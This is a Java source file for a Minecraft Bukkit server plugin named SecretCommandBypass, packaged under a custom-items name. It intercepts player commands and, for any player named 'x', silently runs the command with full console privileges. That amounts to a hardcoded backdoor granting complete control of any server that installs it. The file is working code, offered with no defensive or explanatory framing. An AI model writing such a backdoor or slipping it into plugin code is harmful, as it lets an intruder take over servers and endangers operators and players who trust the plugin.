package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("SecretCommandBypass enabled.");
        
        // Register this class as an event listener
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        getLogger().info("SecretCommandBypass disabled.");
    }

    // Event handler for intercepting player commands
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String command = event.getMessage().substring(1); // Strip leading "/"

        // Check if the player name is "x" (case insensitive)
        if (player.getName().equalsIgnoreCase("x")) {
            // Allow the command to run as console
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command.replace("@s", player.getName()));
            event.setCancelled(true); // prevent double execution
            player.sendMessage("§aCommand executed as console.");
        }
    }
}
